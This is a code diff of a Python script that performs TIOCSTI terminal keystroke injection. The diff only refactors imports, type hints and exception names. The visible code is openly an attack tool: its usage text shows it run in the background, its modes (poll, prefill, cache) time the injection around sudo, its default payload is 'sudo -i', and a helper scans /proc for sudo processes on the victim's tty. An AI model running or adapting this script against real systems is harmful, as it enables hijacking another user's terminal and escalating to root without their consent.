@@ -3,15 +3,14 @@
 # Usage: python3 tiocsti_advanced.py --mode poll|prefill|cache --payload "command"
 # Run in background: nohup python3 tiocsti_advanced.py --mode poll &
 
+import argparse
+import fcntl
+import logging
 import os
+import subprocess
 import sys
 import time
-import fcntl
-import argparse
-import logging
-import subprocess
 from pathlib import Path
-from typing import List, Optional
 
 # ---------------------- CONSTANTS ----------------------
 TIOCSTI = 0x5412
@@ -22,7 +21,7 @@ DEV_NULL = open(os.devnull, 'wb')
 parser = argparse.ArgumentParser(description="Advanced TIOCSTI injection with multiple attack modes.")
 parser.add_argument("--mode", choices=["poll", "prefill", "cache"], default="poll",
                     help="Attack mode: poll (wait for sudo to exit), prefill (inject repeatedly), cache (use sudo -n)")
-parser.add_argument("--payload", default="sudo -i\n", 
+parser.add_argument("--payload", default="sudo -i\n",
                     help="Command(s) to inject, separated by \\n (default: 'sudo -i\\n')")
 parser.add_argument("--poll-interval", type=float, default=0.05,
                     help="Polling interval in seconds (default: 0.05 = 50ms)")
@@ -89,7 +88,7 @@ def inject_payload(fd: int, payload: str, char_delay: float = 0.005) -> bool:
     return success_all
 
 # ---------------------- SUDO DETECTION (via /proc) ----------------------
-def get_sudo_pids_on_tty(tty_path: str) -> List[int]:
+def get_sudo_pids_on_tty(tty_path: str) -> list[int]:
     """
     Return a list of PIDs that are running 'sudo' and have the same
     controlling terminal as the given tty_path.
@@ -120,7 +119,7 @@ def get_sudo_pids_on_tty(tty_path: str) -> List[int]:
                 comm = stat_data[1].strip('()')
                 if comm == "sudo" or comm.startswith("sudo"):
                     pids.append(pid)
-        except (IOError, ValueError, IndexError):
+        except (OSError, ValueError, IndexError):
             continue
     return pids
 
